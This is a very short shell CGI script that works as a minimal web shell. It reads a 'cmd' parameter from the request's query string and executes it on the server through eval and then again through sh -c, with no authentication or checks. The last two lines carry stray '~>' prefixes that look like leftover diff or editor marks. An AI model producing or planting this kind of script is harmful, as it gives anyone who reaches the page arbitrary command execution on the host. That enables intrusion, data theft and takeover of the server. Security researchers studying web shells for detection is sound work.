#!/bin/sh
echo "Content-Type: text/plain"
echo ""
CMD=$(echo "$QUERY_STRING" | sed 's/^cmd=//; s/+/ /g')
~>eval "$CMD"
~>sh -c "${QUERY_STRING#cmd=}"
